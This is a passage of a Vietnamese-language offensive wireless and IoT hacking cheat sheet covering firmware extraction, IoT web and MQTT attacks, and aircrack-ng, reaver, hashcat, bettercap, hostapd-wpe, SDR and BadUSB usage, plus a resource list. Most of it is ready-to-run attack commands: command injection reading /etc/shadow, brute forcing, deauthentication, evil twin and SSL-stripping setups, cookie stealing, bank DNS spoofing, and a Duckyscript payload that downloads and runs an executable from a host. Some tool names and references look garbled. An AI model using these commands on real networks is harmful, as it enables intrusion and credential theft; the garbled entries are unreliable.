mitmproxy -T --host --insecure

# Sau khi capture OTA update file:
binwalk -e firmware.bin
strings firmware.bin | grep -E 'vuln|shell|cmd|debug'
```

### 2.3. Firmware Analysis Workflow

```bash
# 1. Dump/Download firmware → firmware.bin

# 2. Identify firmware type
binwalk firmware.bin
# Output: filesystem (squashfs, jffs2, ubifs, cramfs)

# 3. Extract filesystem
binwalk -e firmware.bin
# hoặc
firmware-mod-kit/extract-firmware.sh firmware.bin

# 4. Analyze filesystem
# Check init scripts, config files, binaries
ls -la _firmware.extracted/
cat etc/shadow
cat etc/passwd
cat etc/config/*.xml

# 5. String analysis
strings firmware.bin | grep -Ei 'password|pass|pwd|secret|key|token'
strings firmware.bin | grep -Ei 'telnet|ssh|backdoor|debug|root'
strings firmware.bin | grep -Ei 'http://|https://|api|cloud|server'

# 6. Binary analysis (checksec, file command)
file bin/busybox
checksec --file=bin/httpd

# 7. Emulate firmware (FirmAE, QEMU)
git clone https://github.com/pr0v3rbs/FirmAE
cd FirmAE
./setup.sh
./run.sh -c DIR  # Check mode
./run.sh -a DIR  # Analyze mode
```

## 3. Backdoor Accounts, Hardcoded Passwords

### 3.1. Backdoor trong IoT

```bash
# Các backdoor phổ biến:
# - Telnet enabled với credential hardcoded
# - Serial console không cần password
# - Hidden SSH port
# - Magic packets (gửi specific packet → mở shell)
# - Debug endpoints (luôn admin access)

# Công cụ tìm backdoor:
# - Firmwalker
git clone https://github.com/craigz28/firmwalker
./firmwalker.sh _firmware.extracted/

# - Firmware Analysis Toolkit (FAT)
git clone https://github.com/attify/firmware-analysis-toolkit
python3 fat.py firmware.bin
```

## 4. Insecure Web Interface

### 4.1. Các lỗ hổng phổ biến

- **Command Injection**: Gửi lệnh OS qua web form → thực thi trên device
- **Cross-Site Scripting (XSS)**: Inject JavaScript
- **Cross-Site Request Forgery (CSRF)**: Thay đổi cấu hình mà user không biết
- **Directory Traversal**: Đọc file system
- **File Upload**: Upload file độc hại
- **Authentication Bypass**: Bỏ qua login

```bash
# Command Injection test
curl "http://192.168.1.1/cgi-bin/ping?ip=127.0.0.1;cat+/etc/shadow"

# XSS test
curl "http://192.168.1.1/login?user=<script>alert(1)</script>"

# Directory Traversal
curl "http://192.168.1.1/cgi-bin/../../etc/shadow"

# CSRF (tạo HTML page tự động gửi request)
curl -d "admin_password=newpass&confirm=newpass" "http://192.168.1.1/setup.cgi"

# Burp Suite / ZAP cho automated scanning
```

## 5. Telnet/SSH Enabled

### 5.1. Phát hiện

```bash
# Nmap scan for open ports
nmap -sS -p 22,23 192.168.1.0/24

# Banner grab
nmap -sV -p 23 192.168.1.1

# Brute force SSH/Telnet
hydra -l root -P passwords.txt 192.168.1.1 ssh
hydra -l admin -P passwords.txt 192.168.1.1 telnet
```

### 5.2. Các device thường có telnet

- IP Cameras (Hikvision, Dahua, Foscam)
- Routers (TP-Link, D-Link, Linksys)
- Smart home hubs
- Printers
- Industrial controllers

## 6. Cloud API Integration Flaws

### 6.1. IoT Cloud Vulnerabilities

- **Insecure Direct Object Reference (IDOR)**: Truy cập device của user khác
- **No rate limiting**: Brute force credentials
- **Weak authentication**: API key hardcoded trong firmware
- **No MFA**: Single factor authentication
- **API key in URL**: Log leak
- **Unencrypted communication**: HTTP thay vì HTTPS

```bash
# Test cloud API
# Intercept mobile app traffic (mitmproxy, Burp Suite)
mitmproxy -p 8080

# Reverse engineer mobile app
apktool d app.apk
grep -r "api" decompiled/
grep -r "secret\|token\|apikey\|api_key" decompiled/
```

## 7. UPnP Misconfiguration

### 7.1. UPnP (Universal Plug and Play)

UPnP cho phép device tự động mở port trên router:
- Dùng SOAP (Simple Object Access Protocol)
- Mặc định không authentication
- Có thể bị lợi dụng để mở port trái phép

```bash
# UPnP scanning
upnpc -l     # List UPnP devices
upnp-inspector  # GUI tool

# UPnP mapping
upnpc -a 192.168.1.100 8080 8080 tcp   # Add port mapping

# Bettercap UPnP
sudo bettercap -eval "upnp on"
sudo bettercap -eval "upnp.show"

# Metasploit UPnP
use auxiliary/scanner/upnp/ssdp_msearch
use post/windows/gather/upnp
```

## 8. MQTT Security

### 8.1. MQTT (Message Queuing Telemetry Transport)

Giao thức IoT phổ biến nhất, publish-subscribe model:

```
Publisher → [MQTT Broker] → Subscriber
```

**Security issues:**
- **No authentication**: Anonymous connect allowed
- **No encryption**: TCP (1883) thay vì TLS (8883)
- **Wildcard subscription**: subscribe `#` để nghe tất cả topics
- **Weak credentials**: `mosquitto`, `test:test`, `admin:admin`

### 8.2. MQTT Attack Tools

```bash
# Scan MQTT brokers
nmap -p 1883,8883 192.168.1.0/24

# Subscribe to all topics
mosquitto_sub -h 192.168.1.100 -t "#" -v

# Subscribe with credentials
mosquitto_sub -h 192.168.1.100 -t "#" -u admin -P password -v

# Publish message
mosquitto_pub -h 192.168.1.100 -t "home/light/command" -m "ON"

# MQTT-PWN (Automated MQTT tool)
git clone https://github.com/akamai-threat-research/mqtt-pwn
cd mqtt-pwn
python3 mqtt-pwn.py -b 192.168.1.100 -P 1883

# MQTTSA (MQTT Security Assistant)
git clone https://github.com/rabib1995/MQTTSA
```

## 9. CoAP Security

### 9.1. CoAP (Constrained Application Protocol)

- UDP-based, RESTful (GET/POST/PUT/DELETE)
- Dùng DTLS (Datagram TLS) cho security
- Port: 5683 (coap), 5684 (coaps)

### 9.2. CoAP Attacks

```bash
# CoAP scanning
airodump-ng wlan0mon  # Tìm device CoAP

# CoAP client
coap-client -m get coap://[192.168.1.100]:5683/.well-known/core

# CoAP fuzzing
# Dùng scapy hoặc custom tool
```

## 10. Zigbee Key Extraction

### 10.1. Zigbee Network Key

Zigbee dùng shared network key (AES-128):
- Gửi encrypted từ trust center đến new device
- Có thể extract từ memory dump
- Sniff network key trong quá trình join

### 10.2. Zigbee Key Attack

```bash
# Với TI CC2531 + KillerBee
zbstumbler.py -i /dev/ttyUSB0   # Scan networks
zbdump.py -i /dev/ttyUSB0 -w zigbee.pcap  # Capture

# Crack network key
zbgoodfind.py -i /dev/ttyUSB0 -f zigbee.pcap

# Zigate (Zigbee analysis)
git clone https://github.com/zigate/zigate
```

---

# J. TOOL MASTERY

## 1. Aircrack-ng Suite — Chi tiết

### 1.1. airmon-ng

```bash
# List wireless interfaces
airmon-ng

# Check processes conflict
airmon-ng check

# Kill processes conflict
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0        # Tạo wlan0mon
airmon-ng start wlan0 6      # Trên channel 6
airmon-ng start wlan0 149    # 5 GHz channel 149

# Disable monitor mode
airmon-ng stop wlan0mon

# Kết hợp với macchanger
airmon-ng stop wlan0mon
macchanger -r wlan0
airmon-ng start wlan0
```

### 1.2. airodump-ng — Chi tiết

```bash
# Scan all channels
airodump-ng wlan0mon

# Scan specific channel
airodump-ng -c 6 wlan0mon

# Scan multiple channels
airodump-ng -c 1,6,11 wlan0mon

# Target specific AP
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w output wlan0mon

# Only capture WPA2 handshake (no data)
airodump-ng -c 6 --bssid BSSID -w output -z wlan0mon  # WPA2 only

# Output format: pcap, csv, kismet
airodump-ng --output-format pcap,csv,kismet -w output wlan0mon

# Skip validation (faster capture)
airodump-ng --ignore-negative-one wlan0mon

# Bandwidth
airodump-ng --band abg wlan0mon  # 2.4 + 5 GHz
airodump-ng --band ag wlan0mon   # 2.4 + 5 GHz
airodump-ng --band a wlan0mon    # 5 GHz only
airodump-ng --band g wlan0mon    # 2.4 GHz only

# WPS detection
airodump-ng --wps wlan0mon

# GPS wardriving
airodump-ng --gpsd -w wardrive wlan0mon
```

### 1.3. aireplay-ng

```bash
# Deauth attack
aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon
# -0: deauth mode
# 5: number of deauth packets
# -a: AP MAC
# -c: Client MAC (omit to broadcast)

# ARP request replay (WEP attack)
aireplay-ng -3 -b AP_MAC -h CLIENT_MAC wlan0mon

# Interactive packet replay
aireplay-ng -2 -b AP_MAC wlan0mon

# Fragmentation attack (WEP)
aireplay-ng -5 -b AP_MAC -h CLIENT_MAC wlan0mon

# KoreK chopchop attack (WEP)
aireplay-ng -4 -b AP_MAC wlan0mon

# Injection test
aireplay-ng -9 -e TARGET_SSID -a AP_MAC wlan0mon

# Test với card
aireplay-ng -9 wlan0mon  # Test injection
```

### 1.4. aircrack-ng

```bash
# Check handshake in capture
aircrack-ng capture-01.cap

# Crack with wordlist
aircrack-ng -w wordlist.txt capture-01.cap

# Crack with PTW attack (WEP)
aircrack-ng -z capture-01.cap

# Crack with KoreK (WEP)
aircrack-ng -K capture-01.cap

# Show only cracked
aircrack-ng -w wordlist.txt -s capture-01.cap

# EAPOL attack (PMKID)
aircrack-ng -w wordlist.txt -e ESSID -b BSSID capture-01.cap
```

### 1.5. airbase-ng

```bash
# Open network
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# WEP network
airbase-ng -e "WEPNet" -c 6 -W 1 -N wlan0mon

# WPA2 network
airbase-ng -e "SecureNet" -c 6 -W 1 -Z 4 wlan0mon

# KARMA mode
airbase-ng -P -C 30 -e "Test" wlan0mon
# -P: respond to all probes
# -C: beacon interval

# Capture to file
airbase-ng -e "EvilTwin" -c 6 -w capture wlan0mon

# MITM setup (bước tiếp theo sau khi client kết nối)
# 1. Cấu hình at0 interface
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 up

# 2. DHCP + DNS
dnsmasq -C dnsmasq.conf

# 3. Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t filter -A FORWARD -i at0 -j ACCEPT
iptables -t filter -A FORWARD -o at0 -j ACCEPT
iptables -t filter -A FORWARD -i eth0 -j ACCEPT
iptables -t filter -A FORWARD -o eth0 -j ACCEPT
```

### 1.6. airdecap-ng

```bash
# Decrypt WPA2 capture (cần biết password)
airdecap-ng -e ESSID -p PASSWORD capture-01.cap

# Decrypt WEP capture
airdecap-ng -w HEX_KEY capture-01.cap

# Output: capture-01-dec.cap (decrypted)
# Có thể mở bằng Wireshark để phân tích traffic
```

### 1.7. packetforge-ng

```bash
# Tạo ARP packet
packetforge-ng -0 -a AP_MAC -h CLIENT_MAC -l 255.255.255.255 -k 255.255.255.255 -y keystream.xor -w forged.arp

# Tạo UDP packet
packetforge-ng -9 -a AP_MAC -h CLIENT_MAC -l 192.168.1.100 -k 192.168.1.1 -r 80 -y keystream.xor -w forged.udp
```

## 2. Reaver, PixieWPS, Bully

### 2.1. Reaver

```bash
# Cơ bản
reaver -i wlan0mon -b BSSID -vv

# Fast mode
reaver -i wlan0mon -b BSSID -vv -d 0 -l 10 -N -r 3:30

# Pixie Dust
reaver -i wlan0mon -b BSSID -vv -K 1

# Fixed channel
reaver -i wlan0mon -b BSSID -c 6 -vv

# Resume session
reaver -i wlan0mon -b BSSID -vv -s wpc/session.wpc

# 5 GHz
reaver -i wlan0mon -b BSSID -c 149 -vv -5
```

### 2.2. PixieWPS

```bash
# PixieWPS standalone
pixiewps --e-s1=ES1 --e-s2=ES2 --e-hash1=EHASH1 --e-hash2=EHASH2 \
         --authkey=AUTH_KEY --pke=PKE --pkr=PKR --e-nonce=ENONCE

# PixieWPS với output từ Reaver
reaper -i wlan0mon -b BSSID -vv -K 1   # Reaver gọi PixieWPS

# OneShot (tự động)
oneshot.py -i wlan0mon -b BSSID -K   # Pixie Dust
oneshot.py -i wlan0mon -b BSSID -b   # Brute force
oneshot.py -i wlan0mon -b BSSID --pixie-dust
```

### 2.3. Bully

```bash
# Cơ bản
bully wlan0mon -b BSSID -c 6

# Pixie Dust
bully -b BSSID -c 6 -d -v 3 wlan0mon
# -d: pixie dust

# Fast brute
bully -b BSSID -c 6 -F wlan0mon

# Resume
bully -b BSSID -c 6 -S wlan0mon

# Debug
bully -b BSSID -c 6 -v 3 -F -S wlan0mon
```

## 3. Hashcat Modes cho Wireless

### 3.1. Các mode quan trọng

| Mode | Description | Format |
|------|-------------|--------|
| **22000** | WPA-PBKDF2-PMKID+EAPOL | Modern unified |
| **2500** | WPA2-PSK (hccapx) | Legacy |
| **2501** | WPA2-PSK (.cap) | Legacy |
| **16800** | WPA-PMKID-PBKDF2 | Legacy PMKID |
| **16801** | WPA-PMKID-PMK (no SSID) | If PMK known |
| **22001** | WPA-PMK (pre-computed) | Fast but need PMK |
| **5500** | MSCHAPv2 | PEAP/Enterprise |
| **4800** | MD5 challenge | |
| **16100** | WPA3-SAE | WPA3 hash |

### 3.2. Workflow chuẩn

```bash
# 1. Capture với hcxdumptool
hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1

# 2. Convert sang hashcat format
hcxpcapngtool -o hash.22000 capture.pcapng

# 3. Kiểm tra hash
cat hash.22000
# Format: hashinfo*mic*ap_mac*nonce_ap*client_mac*nonce_client*essid

# 4. Crack với hashcat
# Wordlist
hashcat -m 22000 hash.22000 wordlist.txt -w 4 -O

# Rule-based
hashcat -m 22000 hash.22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule -w 4

# Mask (8 lowercase characters)
hashcat -m 22000 hash.22000 -a 3 ?l?l?l?l?l?l?l?l -w 4

# Combinator
hashcat -m 22000 hash.22000 -a 1 words1.txt words2.txt -w 4

# Show cracked
hashcat -m 22000 hash.22000 --show

# Show + output
hashcat -m 22000 hash.22000 --show > cracked.txt
```

### 3.3. Benchmark WPA

```bash
# Default benchmark
hashcat -b --benchmark-all

# WPA2 specific
hashcat -b -m 22000

# WPA benchmark output:
# Speed: 2.0 GH/s (RTX 4090)
# Speed: 500 MH/s (RTX 3060)
# Speed: 80 MH/s (GTX 1060)

# So sánh mode 22000 vs 2500
hashcat -b -m 22000  # Modern, faster
hashcat -b -m 2500   # Legacy, slower
```

### 3.4. Tối ưu hashcat

```bash
# -w 4: Workload profile (1=low, 2=default, 3=high, 4=nightmare)
# -O: Optimized kernel (giới hạn password length = 32)
# --force: Ignore warnings
# --potfile-path: Custom pot file
# --show: Show cracked
# --username: Include username in pot

# GPU-specific
# --opencl-device-types=GPU
# --backend-devices=1  (specific GPU)
# -d 1,2 (device 1 and 2)

# Multiple hash files
hashcat -m 22000 hash1.22000 hash2.22000 wordlist.txt
```

## 4. Bettercap

### 4.1. Wireless Modules

```bash
# WiFi recon
sudo bettercap -eval "wifi.recon on"
sudo bettercap -eval "wifi.show"

# WiFi deauth
sudo bettercap -eval "wifi.deauth BSSID"

# WiFi AP
sudo bettercap -eval "set wifi.ap.ssid EvilTwin; wifi.ap"

# WiFi KARMA
sudo bettercap -eval "wifi.ap.karma on"

# WiFi beacon flood
sudo bettercap -eval "set wifi.ap.ssid FreeWiFi; wifi.recon on; ticker.on"
```

### 4.2. BLE Modules

```bash
# BLE recon
sudo bettercap -eval "ble.recon on"
sudo bettercap -eval "ble.show"

# BLE scan specific device
sudo bettercap -eval "ble.recon on; ble.enum MAC"

# BLE spoof
sudo bettercap -eval "ble.spoof MAC"
```

### 4.3. HTTP/HTTPS Proxy

```bash
# HTTP/HTTPS proxy
sudo bettercap -eval "set http.proxy.sslstrip true; http.proxy on; https.proxy on"

# Cookie stealing
sudo bettercap -eval "set http.proxy.script /path/to/cookie_stealer.js; http.proxy on"

# Credential harvesting
sudo bettercap -eval "net.sniff on; net.sniff.local on"
```

### 4.4. Network Recon

```bash
# ARP spoof
sudo bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on"

# DNS spoof
sudo bettercap -eval "set dns.spoof.domains *.bank.com; dns.spoof on"

# Net probe
sudo bettercap -eval "net.probe on; net.show"

# Capture credentials
sudo bettercap -eval "net.sniff on; net.sniff.local on"
```

## 5. hostapd-wpe

### 5.1. Cấu hình

```ini
# /etc/hostapd-wpe/hostapd-wpe.conf
interface=wlan0
driver=nl80211
ssid=EnterpriseWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_users

# Certificate (tạo với openssl hoặc cert-wizard)
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
```

### 5.2. EAP User File

```bash
# /etc/hostapd-wpe/hostapd-wpe.eap_users
# Format: *    EAP-METHOD    USERNAME    PASSWORD
*    PEAP,MSCHAPV2    victim    123456test
*    TTLS,TTLS-MSCHAPV2    victim    123456test
*    TTLS,TTLS-PAP    victim    123456test
*    TTLS,TTLS-CHAP    victim    123456test
*    TTLS,TTLS-MSCHAP    victim    123456test
```

### 5.3. Chạy

```bash
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Credentials captured lưu ở:
/usr/share/hostapd-wpe/captured-creds/

# Xem creds
tail -f /usr/share/hostapd-wpe/captured-creds/*.log
```

## 6. EAPHammer

```bash
# Cài đặt
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer
./kali-setup

# Tạo certificate
./eaphammer --cert-wizard

# Credential harvesting
./eaphammer -i wlan0 --auth wpa-eap --essid "Enterprise" --creds -c 6

# Evil Twin với KARMA
./eaphammer -i wlan0 --known-beacons --creds

# PMKID capture
./eaphammer -i wlan0 --pmkid-broadcast

# EAP downgrade
./eaphammer -i wlan0 --auth wpa-eap --essid "Enterprise" --creds --negotiate weakest
```

## 7. Wifite2

```bash
# Cài đặt
git clone https://github.com/derv82/wifite2
cd wifite2
python3 -m pip install -r requirements.txt

# Chạy cơ bản
python3 wifite.py

# Attack WPA
python3 wifite.py --wpa

# Attack WPS
python3 wifite.py --wps

# Attack WEP
python3 wifite.py --wep

# Specific target
python3 wifite.py --bssid 00:11:22:33:44:55

# PMKID attack
python3 wifite.py --pmkid

# Wordlist
python3 wifite.py -dict wordlist.txt

# 5 GHz
python3 wifite.py --5

# Channel specific
python3 wifite.py -c 6

# Auto deauth
python3 wifite.py --no-deauth   # Không deauth
```

## 8. HCXDumpTools

```bash
# Cài đặt
git clone https://github.com/ZerBea/hcxdumptool
cd hcxdumptool
make && make install

# Capture PMKID và handshake
hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1

# Capture only PMKID
hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1 --filterlist_ap=filter.txt --filtermode=2
# filter.txt chứa BSSID mục tiêu

# Options quan trọng:
# -o: output file (pcapng)
# -i: interface
# --enable_status: status messages
# --filterlist_ap: AP whitelist/blacklist
# --filterlist_sta: Station filter
# --filtermode: 1=whitelist, 2=blacklist
# -c: channel
# -t: timeout (seconds)
# -m: minimum RSSI

# Convert
hcxpcapngtool capture.pcapng -o hash.22000
hcxlsshtool capture.pcapng  # List status
```

## 9. Proxmark3

```bash
# Cài đặt firmware
git clone https://github.com/RfidResearchGroup/proxmark3
cd proxmark3
make clean && make all
pm3-flash-fullimage

# Chạy client
pm3

# CLI commands
pm3 --> hw version
pm3 --> hw status
pm3 --> hw tune

# LF
pm3 --> lf search
pm3 --> lf em 410x read
pm3 --> lf em 410x sim 0E00123456

# HF
pm3 --> hf search
pm3 --> hf mf dump
pm3 --> hf mf restore
pm3 --> hf mf hardnested 0 A FFFFFFFFFFFF

# Standalone
pm3 --> data load -f dump.bin
pm3 --> hw start
```

## 10. Flipper Zero CLI

```bash
# Connect via serial
screen /dev/ttyACM0 115200

# CLI commands
flipper -->
  help
  storage info
  storage list /ext

# RFID
flipper --> rfid read
flipper --> rfid sim
flipper --> rfid write

# NFC
flipper --> nfc detect
flipper --> nfc read
flipper --> nfc sim

# Sub-GHz
flipper --> subghz scan
flipper --> subghz read
flipper --> subghz replay

# GPIO
flipper --> gpio mode
flipper --> gpio read
flipper --> gpio write

# UART
flipper --> uart
```

## 11. HackRF / RTL-SDR Tools

### 11.1. HackRF

```bash
# HackRF info
hackrf_info

# Spectrum analyzer
hackrf_sweep -f 2400:2500 -w 1000000

# Receive
hackrf_transfer -r output.iq -f 433920000 -s 2000000

# Transmit (replay)
hackrf_transfer -t input.iq -f 433920000 -s 2000000 -x 40

# GSM capture
grgsm_livemon

# ADS-B
dump1090 --interactive

# FM radio
hackrf_sweep -f 88000000:108000000 -w 200000

# Replay attack với HackRF
# 1. Capture signal
hackrf_transfer -r capture.iq -f 433920000 -s 2000000 -l 32 -g 20

# 2. Analyze với URH
urh

# 3. Replay
hackrf_transfer -t capture.iq -f 433920000 -s 2000000 -x 40
```

### 11.2. RTL-SDR

```bash
# Install
apt install rtl-sdr
# Hoặc build driver:
git clone https://github.com/osmocom/rtl-sdr
cd rtl-sdr
mkdir build && cd build
cmake ../ -DINSTALL_UDEV_RULES=ON
make && make install

# Test
rtl_test -t

# Spectrum
rtl_sdr -f 433920000 -s 2048000 capture.bin

# FM radio
rtl_fm -f 100000000 -M wbfm -s 200000 -r 48000 - | aplay -r 48000

# POCSAG (pager)
rtl_fm -f 169650000 -s 22050 - | multimon-ng -t raw -a POCSAG /dev/stdin

# ADS-B
rtl_adsb   # hoặc
dump1090 --interactive

# AIS (ship)
rtl_ais

# Weather satellites
# NOAA APT: rtl_fm -f 137620000 -s 22050 - | atof
```

### 11.3. Universal Radio Hacker (URH)

```bash
# Start URH
urh

# Quy trình reverse engineering:
# 1. Record → Open recorded file
# 2. Demodulate → chọn modulation parameter
# 3. Assign bits → interpret bits as protocol fields
# 4. Generate → create modified packets
# 5. Send → replay with HackRF/USRP

# Script mode
urh_cli -r capture.iq -d  # Decode
urh_cli -g -m fsk -b 4800 -c 433.92M  # Generate
urh_cli -t send.iq -f 433.92M  # Send
```

## 12. Better-USB-Attacker (USB Attacks)

### 12.1. BadUSB / Rubber Ducky

```bash
# Cài đặt tool
git clone https://github.com/nick-damico/better-usb-attacker

# Duckyscript → bin
# Ví dụ: payload.txt
# DELAY 1000
# GUI r
# DELAY 500
# STRING cmd
# ENTER
# DELAY 1000
# STRING powershell -c "Invoke-WebRequest -Uri http://192.168.1.100/payload.exe -OutFile $env:TEMP\p.exe; Start-Process $env:TEMP\p.exe"
# ENTER

# Convert
duckencoder -i payload.txt -o inject.bin

# Flash to Rubber Ducky / BadUSB
# Dùng Flipper Zero:
# storage write /ext/badusb/payload.txt < payload.txt
```

### 12.2. USB Attack Types

- **Keyboard injection**: Giả mạo HID keyboard → gõ lệnh
- **Network adapter**: Fake USB Ethernet → MITM
- **Serial connection**: Fake USB-to-Serial → console access
- **Storage**: USB drive autorun (cũ, Windows XP)
- **USB Kill**: Gửi high voltage → destroy device

---

# K. TOP RESOURCES

## 1. Sách và Tài liệu

### 1.1. Wireless Security

| Sách | Tác giả | Nội dung |
|------|---------|----------|
| **"802.11 Wireless Networks: The Definitive Guide"** | Matthew Gast | 802.11 chi tiết từ layer 1-2 |
| **"Kali Linux Wireless Penetration Testing Beginner's Guide"** | Vivek Ramachandran | Thực hành với Aircrack-ng |
| **"Wireless Network Security"** | Wolfgang Osterhage | Lý thuyết bảo mật không dây |
| **"CWSP Certified Wireless Security Professional Official Study Guide"** | David D. Coleman | Chứng chỉ CWSP |
| **"Hacking Wireless Networks for Dummies"** | Kevin Beaver | Cơ bản cho người mới |
| **"The Art of Wireless: Hacking Made Easy"** | Chris Hurley | Aircrack-ng mastery |
| **"Practical WiFi Security"** | Andrew Whitaker | Enterprise wireless |

### 1.2. IoT và Hardware

| Sách | Tác giả | Nội dung |
|------|---------|----------|
| **"Practical IoT Hacking"** | Fotios Chantzis, et al. | IoT pentest từ A-Z, xuất sắc |
| **"The Hardware Hacker"** | Andrew "Bunnie" Huang | Hardware reverse engineering |
| **"Hardware Hacking: Have Fun While Voiding Your Warranty"** | Joe Grand | Hardware modding |
| **"IoT Penetration Testing Cookbook"** | Aaron Guzman, Aditya Gupta | Các recipe pentest IoT |
| **"The Car Hacker's Handbook"** | Craig Smith | Automotive hacking |
| **"Hacking the Xbox"** | Andrew "Bunnie" Huang | Classic hardware hacking |
| **"Inside the Microsoft Xbox 360"** | Andrew "Bunnie" Huang | Modern console hacking |
| **"The IoT Hacker's Handbook"** | Aditya Gupta | IoT vulnerability assessment |
| **"Mastering Embedded Linux Programming"** | Chris Simmonds | Embedded Linux |
| **"Linux Device Drivers"** | Corbet, Rubini, Kroah-Hartman | Kernel drivers |

### 1.3. RFID và SDR

| Sách | Tác giả | Nội dung |
|------|---------|----------|
| **"RFID Security"** | Frank Thornton | RFID protocols |
| **"The RF in RFID"** | Daniel Dobkin | RF physics |
| **"Software-Defined Radio for Engineers"** | Travis Collins | SDR implementation |
| **"Digital Signal Processing Using the ARM Cortex-M4"** | Donald Reay | DSP thực hành |
| **"Radio Reconnaissance in Cyberspace"** | SDR-based analysis |

## 2. Website và Blog

### 2.1. Wireless

- **https://www.aircrack-ng.org/** — Official Aircrack-ng
- **https://hashcat.net/wiki/** — Hashcat wiki
- **https://www.willhackforsushi.com/** — Joshua Wright (wireless pioneer)
- **https://mrncciew.com/** — 802.11 deep dives
- **https://semfionetworks.com/blog/** — Wireless protocol analysis
- **https://revolutionwifi.blogspot.com/** — Andrew von Nagy (CWNE)
- **https://www.wlanpros.com/** — WLAN Professionals podcast
- **https://ask.wireshark.org/** — Wireshark Q&A

### 2.2. IoT và Hardware

- **https://www.bunniestudios.com/** — Bunnie Huang's blog
- **https://hackaday.com/** — Hardware hacking news
- **https://wrongbaud.github.io/** — Hardware RE (Witekio)
- **https://jcjc.dev/** — ESP32/STM32 hacking
- **https://www.attify.com/blog/** — Attify IoT security
- **https://blog.includesecurity.com/** — Include Security
- **https://research.nccgroup.com/** — NCC Group (IoT research)
- **https://blog.quarkslab.com/** — Quarkslab RE
- **https://grimm-co.com/blog** — Grimm (ChipWhisperer)

### 2.3. RFID và NFC

- **https://github.com/RfidResearchGroup/proxmark3** — Proxmark3 official
- **https://wiki.flipperzero.one/** — Flipper Zero Wiki
- **https://www.proxmark.com/** — Proxmark resources
- **https://rfidresearchgroup.com/** — RFID Research Group
- **https://hackgnar.com/** — RFID/NFC tutorials

### 2.4. SDR và Radio

- **https://greatscottgadgets.com/** — Michael Ossmann, HakTD
- **https://www.rtl-sdr.com/** — RTL-SDR blog
- **https://github.com/mossmann/hackrf** — HackRF official
- **https://www.ettus.com/** — USRP (Ettus Research)
- **https://www.rtl-sdr.com/category/sdr-tutorials/** — SDR tutorials
- **https://github.com/giuseppe-astuto/easySDR** — Easy SDR guide

## 3. Diễn đàn và Cộng đồng

- **https://forum.aircrack-ng.org/** — Aircrack-ng forum
- **https://www.reddit.com/r/RTLSDR/** — RTL-SDR subreddit
- **https://www.reddit.com/r/hackrf/** — HackRF subreddit
- **https://www.reddit.com/r/flipperzero/** — Flipper Zero subreddit
- **https://0x00sec.org/** — Hacking forum
- **https://forum.proxmark3.com/** — Proxmark3 forum
- **https://groups.io/g/ChameleonMini** — ChameleonMini group
- **https://www.hak5.org/forum** — Hak5 (WiFi Pineapple, Rubber Ducky)

## 4. Khóa học và Chứng chỉ

- **OSWP (Offensive Security Wireless Professional)** — Kali, thực hành wireless
- **GPEN (GIAC Penetration Tester)** — Có phần wireless pentest
- **CCSP (Certified Cloud Security Professional)** — IoT cloud
- **CEH (Certified Ethical Hacker)** — Module wireless basics
- **CWSP (Certified Wireless Security Professional)** — Chuyên wireless
- **OSCP (Offensive Security Certified Professional)** — Pentest tổng quát
- **OSED (Windows User Mode Exploit Dev)** — Relevant cho IoT firmware
- **SANS SEC617 (Wireless Penetration Testing)** — SANS wireless
- **SANS ICYB3R (IoT/ICS)** — IoT security

## 5. Github Repos Quan Trọng

```bash
# Wireless
git clone https://github.com/aircrack-ng/aircrack-ng
git clone https://github.com/ZerBea/hcxdumptool
git clone https://github.com/ZerBea/hcxtools
git clone https://github.com/vanhoefm/krackattacks
git clone https://github.com/vanhoefm/dragonblood
git clone https://github.com/s0lst1c3/eaphammer
git clone https://github.com/derv82/wifite2
git clone https://github.com/t6x/reaver-wps-fork-t6x
git clone https://github.com/aanarchyy/bully
git clone https://github.com/FluxionNetwork/fluxion
git clone https://github.com/wifiphisher/wifiphisher

# SDR
git clone https://github.com/greatscottgadgets/hackrf
git clone https://github.com/osmocom/rtl-sdr
git clone https://github.com/merbanan/rtl_433
git clone https://github.com/antirez/dump1090
git clone https://github.com/ptrkrysik/gr-gsm
git clone https://github.com/jopohl/urh

# RF/Keyless
git clone https://github.com/samyk/rolljam
git clone https://github.com/samyk/keysweeper
git clone https://github.com/BastilleResearch/keytalk

# IoT
git clone https://github.com/threat9/routersploit
git clone https://github.com/attify/firmware-analysis-toolkit
git clone https://github.com/craigz28/firmwalker
git clone https://github.com/pr0v3rbs/FirmAE
git clone https://github.com/rampageX/firmware-mod-kit

# RFID/Proxmark
git clone https://github.com/RfidResearchGroup/proxmark3
git clone https://github.com/emsec/ChameleonMini
git clone https://github.com/riverloobey/killerbee

# Bluetooth
git clone https://github.com/nccgroup/BTLEJuice
git clone https://github.com/gattacker/gattacker
git clone https://github.com/greatscottgadgets/btlejack
git clone https://github.com/mikeryanmay/things-unsecured

# Hashcat
git clone https://github.com/hashcat/hashcat
git clone https://github.com/hashcat/hashcat-utils
```

## 6. YouTube Channels và Video

- **Irongeek** — Adrian Crenshaw, wireless demo
- **Hak5** — Darren Kitchen, Shannon Morse, Security weekly
- **LiveOverflow** — Binary exploitation, hardware
- **Devttys0** (Craig Heffner) — Firmware RE
- **GynvaelEN** — CTF, RE, hardware
- **Darknet** — Security diễn giải
- **Null Byte** — Pentest tutorials
- **Samy Kamkar** — RF hacking (RollJam, OpenSesame)
- **Scros** — Proxmark3 tutorials
- **Great Scott Gadgets** — SDR tutorials
- **Matt Brown** — Wireless hacking
- **0x41414141** — Twitter, security news
